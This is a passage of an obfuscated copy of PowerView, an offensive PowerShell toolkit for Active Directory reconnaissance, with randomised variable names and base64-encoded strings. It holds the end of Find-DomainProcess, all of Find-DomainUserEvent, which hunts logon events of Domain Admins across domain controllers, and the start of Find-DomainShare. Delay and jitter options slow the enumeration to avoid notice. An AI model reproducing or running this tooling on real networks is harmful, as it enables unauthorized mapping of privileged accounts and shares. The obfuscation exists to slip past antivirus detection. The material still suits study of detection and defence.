$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
DomainProcess] Enumerating server 
${40850bc66a0f4e928e6df4b311ffe16b} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count))"
                
${cb7c2f5226ed472aad598a82813f1629} = Invoke-Command -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ArgumentList 
${40850bc66a0f4e928e6df4b311ffe16b}, 
${fba72d492e4141e9a7ec127b64bd851a}, $TargetUsers, $Credential
       
         ${cb7c2f5226ed472aad598a82813f1629}
                if 
(${cb7c2f5226ed472aad598a82813f1629} -and $StopOnSuccess) {
          
          Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVABhAHIAZw
BlAHQAIAB1AHMAZQByACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAG
UAYQByAGwAeQA=')))
                    return
                }
        
    }
        }
        else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVQBzAGkAbg
BnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6AC
AAJABUAGgAcgBlAGEAZABzAA==')))
            
${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                
'ProcessName' = ${fba72d492e4141e9a7ec127b64bd851a}
                
'TargetUsers' = $TargetUsers
                'Credential' = 
$Credential
            }
            New-ThreadedFunction -
ComputerName ${e4eae45442e047e5aa48d7f04d9dc941} -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
}
function Find-DomainUserEvent {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseDeclaredVarsMoreThanAssignments', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUsePSCredentialType', '')]
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType
('PowerView.LogonEvent')]
    [OutputType
('PowerView.ExplicitCredentialLogon')]
    [CmdletBinding
(DefaultParameterSetName = 'Domain')]
    Param(
        [Parameter
(ParameterSetName = 'ComputerName', Position = 0, ValueFromPipeline 
= $True, ValueFromPipelineByPropertyName = $True)]
        [Alias
('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $ComputerName,
        [Parameter
(ParameterSetName = 'Domain')]
        [ValidateNotNullOrEmpty()]
     
   [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Hashtable]
        $Filter,
        [Parameter
(ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [DateTime]
        $StartTime = 
[DateTime]::Now.AddDays(-1),
        [Parameter
(ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [DateTime]
        $EndTime = 
[DateTime]::Now,
        [ValidateRange(1, 1000000)]
        [Int]
     
   $MaxEvents = 5000,
        [ValidateNotNullOrEmpty()]
        
[String[]]
        $UserIdentity,
        [ValidateNotNullOrEmpty()]
   
     [String]
        $UserDomain,
        [ValidateNotNullOrEmpty()]
  
      [String]
        $UserLDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
   
     [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 
'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain 
Admins',
        [Alias('AdminCount')]
        [Switch]
        
$UserAdminCount,
        [Switch]
        $CheckAccess,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        
$Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        
$Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        
$Threads = 20
    )
    BEGIN {
        
${79ab263811814b73a0d9eb6e9491daf2} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) 
{ ${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${79ab263811814b73a0d9eb6e9491daf2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] 
-or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) {
            
$TargetUsers = Get-DomainUser @79ab263811814b73a0d9eb6e9491daf2 | 
Select-Object -ExpandProperty samaccountname
        }
        elseif 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5AA==')))] -or (-not 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAGwAdABlAHIA')))])) {
            
${d868f016ade44d61bff142865900b62c} = @{
                'Identity' = 
$UserGroupIdentity
                'Recurse' = $True
            }
     
       Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBzAGUAcgBHAHIAbwB1AHAASQBkAGUAbgB0AGkAdAB5ADoAIAAkAFUAcwBlAHIARw
ByAG8AdQBwAEkAZABlAG4AdABpAHQAeQA=')))
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) 
{ ${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
          if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${d868f016ade44d61bff142865900b62c}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
$TargetUsers = Get-DomainGroupMember 
@d868f016ade44d61bff142865900b62c | Select-Object -ExpandProperty 
MemberName
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            
${e4eae45442e047e5aa48d7f04d9dc941} = $ComputerName
        }
        
else {
            ${b14bc7e981fe421a972d35fec58e00f2} = @{
           
     'LDAP' = $True
            }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${b14bc7e981fe421a972d35fec58e00f2}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFEAdQ
BlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAG
wAZQByAHMAIABpAG4AIABkAG8AbQBhAGkAbgA6ACAAJABEAG8AbQBhAGkAbgA=')))
   
         ${e4eae45442e047e5aa48d7f04d9dc941} = Get-DomainController 
@b14bc7e981fe421a972d35fec58e00f2 | Select-Object -ExpandProperty 
dnshostname
        }
        if (${e4eae45442e047e5aa48d7f04d9dc941} 
-and (${e4eae45442e047e5aa48d7f04d9dc941} -isnot [System.Array])) {
  
          ${e4eae45442e047e5aa48d7f04d9dc941} = @(,
${e4eae45442e047e5aa48d7f04d9dc941})
        }
        Write-Verbose 
"[Find-DomainUserEvent] TargetComputers length: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.Length)"
        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQ
ByAGcAZQB0AEMAbwBtAHAAdQB0AGUAcgBzACAAJAB7AGUANABlAGEAZQA0ADUANAA0AD
IAZQAwADQANwBlADUAYQBhADQAOABkADcAZgAwADQAZAA5AGQAYwA5ADQAMQB9AA==')
))
        if (${e4eae45442e047e5aa48d7f04d9dc941}.Length -eq 0) {
    
        throw $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAE4Abw
AgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA
==')))
        }
        ${d2a8f7b9002b4411b13bcd2f1a3115ec} = {
       
     Param($ComputerName, $StartTime, $EndTime, $MaxEvents, 
$TargetUsers, $Filter, $Credential)
            ForEach 
(${40850bc66a0f4e928e6df4b311ffe16b} in $ComputerName) {
             
   ${4efbcb35501b479291674720e11a9ca9} = Test-Connection -Count 1 -
Quiet -ComputerName ${40850bc66a0f4e928e6df4b311ffe16b}
              
  if (${4efbcb35501b479291674720e11a9ca9}) {
                    
${c488461df04b41d3807e4abe4dcc7213} = @{
                        
'ComputerName' = ${40850bc66a0f4e928e6df4b311ffe16b}
                 
   }
                    if ($StartTime) { 
${c488461df04b41d3807e4abe4dcc7213}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB0AGEAcgB0AFQAaQBtAGUA')))] = $StartTime }
                    if 
($EndTime) { ${c488461df04b41d3807e4abe4dcc7213}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQBuAGQAVABpAG0AZQA=')))] = $EndTime }
                    if 
($MaxEvents) { ${c488461df04b41d3807e4abe4dcc7213}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgARQB2AGUAbgB0AHMA')))] = $MaxEvents }
                    if 
($Credential) { ${c488461df04b41d3807e4abe4dcc7213}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                  
  if ($Filter -or $TargetUsers) {
                        if 
($TargetUsers) {
                            Get-DomainUserEvent 
@c488461df04b41d3807e4abe4dcc7213 | Where-Object {$TargetUsers -
contains $_.TargetUserName}
                        }
                 
       else {
                            
${9785c19a745842a69c0201e19ca66f23} = 'or'
                           
 $Filter.Keys | ForEach-Object {
                                if 
(($_ -eq 'Op') -or ($_ -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -or ($_ 
-eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))) {
       
                             if (($Filter[$_] -match '&') -or 
($Filter[$_] -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('YQBuAGQA'))))) {
                       
                 ${9785c19a745842a69c0201e19ca66f23} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBuAGQA')))
                                    }
                  
              }
                            }
                         
   ${39b9ef9b92054574884f3fb7ba3806a3} = $Filter.Keys | Where-Object 
{($_ -ne 'Op') -and ($_ -ne $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBwAGUAcgBhAHQAbwByAA==')))) -and ($_ 
-ne $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBvAG4A'))))}
         
                   Get-DomainUserEvent 
@c488461df04b41d3807e4abe4dcc7213 | ForEach-Object {
                 
               if (${9785c19a745842a69c0201e19ca66f23} -eq 'or') {
   
                                 ForEach 
(${647da57433db4e15bf0f72731d2eab78} in 
${39b9ef9b92054574884f3fb7ba3806a3}) {
                               
         if ($_."${647da57433db4e15bf0f72731d2eab78}" -match 
$Filter[${647da57433db4e15bf0f72731d2eab78}]) {
                      
                      $_
                                        }
    
                                }
                                }
   
                             else {
                                  
  ForEach (${647da57433db4e15bf0f72731d2eab78} in 
${39b9ef9b92054574884f3fb7ba3806a3}) {
                               
         if ($_."${647da57433db4e15bf0f72731d2eab78}" -notmatch 
$Filter[${647da57433db4e15bf0f72731d2eab78}]) {
                      
                      break
                                        
}
                                        $_
                          
          }
                                }
                         
   }
                        }
                    }
                   
 else {
                        Get-DomainUserEvent 
@c488461df04b41d3807e4abe4dcc7213
                    }
               
 }
            }
        }
    }
    PROCESS {
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-
Verbose "[Find-DomainUserEvent] Total number of hosts: 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count)"
            Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAEQAZQ
BsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AH
QAZQByAA==')))
            ${7e62acf6abb54c758ee4864a2533a125} = 0
    
        ${acdea612248b49fc9b8ce2f557f219ab} = New-Object 
System.Random
            ForEach 
(${40850bc66a0f4e928e6df4b311ffe16b} in 
${e4eae45442e047e5aa48d7f04d9dc941}) {
                
${7e62acf6abb54c758ee4864a2533a125} = 
${7e62acf6abb54c758ee4864a2533a125} + 1
                Start-Sleep 
-Seconds ${acdea612248b49fc9b8ce2f557f219ab}.Next((1-$Jitter)*
$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-
DomainUserEvent] Enumerating server 
${40850bc66a0f4e928e6df4b311ffe16b} 
(${7e62acf6abb54c758ee4864a2533a125} of 
$(${e4eae45442e047e5aa48d7f04d9dc941}.count))"
                
${cb7c2f5226ed472aad598a82813f1629} = Invoke-Command -ScriptBlock 
${d2a8f7b9002b4411b13bcd2f1a3115ec} -ArgumentList 
${40850bc66a0f4e928e6df4b311ffe16b}, $StartTime, $EndTime, 
$MaxEvents, $TargetUsers, $Filter, $Credential
                
${cb7c2f5226ed472aad598a82813f1629}
                if 
(${cb7c2f5226ed472aad598a82813f1629} -and $StopOnSuccess) {
          
          Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFQAYQ
ByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAG
cAIABlAGEAcgBsAHkA')))
                    return
                }
    
        }
        }
        else {
            Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBFAHYAZQBuAHQAXQAgAFUAcw
BpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAH
MAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            
${d7a06eecc9954e48b3afbf05a1f9fca1} = @{
                'StartTime' 
= $StartTime
                'EndTime' = $EndTime
                
'MaxEvents' = $MaxEvents
                'TargetUsers' = 
$TargetUsers
                'Filter' = $Filter
                
'Credential' = $Credential
            }
            New-
ThreadedFunction -ComputerName ${e4eae45442e047e5aa48d7f04d9dc941} 
-ScriptBlock ${d2a8f7b9002b4411b13bcd2f1a3115ec} -ScriptParameters 
${d7a06eecc9954e48b3afbf05a1f9fca1} -Threads $Threads
        }
    }
}
function Find-DomainShare {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.ShareInfo')]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DNSHostName')]
        [String[]]
        $ComputerName,
        
[ValidateNotNullOrEmpty()]
        [Alias('Domain')]
        [String]
  
      $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        
[String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty
()]
        [String]
        $ComputerSearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        
[String]
        $ComputerOperatingSystem,
        
[ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        
[String]
        $ComputerServicePack,
        
[ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        
[String]
        $ComputerSiteName,
        [Alias('CheckAccess')]
     
   [Switch]
        $CheckShareAccess,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [ValidateRange
(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange
(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        
[ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        
${3cb1483537e3424195869ccaa8e07f42} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = $Unconstrained }
       
 if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')
))]) { ${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = $OperatingSystem 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = $ServicePack }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${3cb1483537e3424195869ccaa8e07f42}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
